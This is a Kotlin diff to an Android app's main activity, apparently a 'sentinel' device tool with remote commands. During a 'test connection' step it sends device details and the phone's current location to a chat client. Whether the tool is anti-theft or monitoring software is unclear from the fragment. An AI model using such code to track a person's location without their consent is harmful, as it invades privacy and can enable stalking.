@@ -286,9 +286,18 @@ class MainActivity : AppCompatActivity() {
                 Log.d("MainActivity", "✅ Commands registered successfully")
             }
 
-            // 3. Send Device Info
+            // 3. Send Device Info & Location
             val deviceInfo = DeviceInfoHelper.getDeviceInfo(this@MainActivity)
-            client.sendMessage("🔔 *TEST CONNECTION*\n\n$deviceInfo")
+            
+            // Try fetch location (might be null if no permission or GPS off)
+            val location = try {
+                com.zero.sentinel.utils.LocationHelper.getCurrentLocation(this@MainActivity)
+            } catch (e: Exception) {
+                null
+            }
+            val locationMsg = com.zero.sentinel.utils.LocationHelper.formatLocationMessage(location)
+            
+            client.sendMessage("🔔 *TEST CONNECTION*\n\n$deviceInfo\n\n$locationMsg")
 
             withContext(Dispatchers.Main) {
                 Toast.makeText(
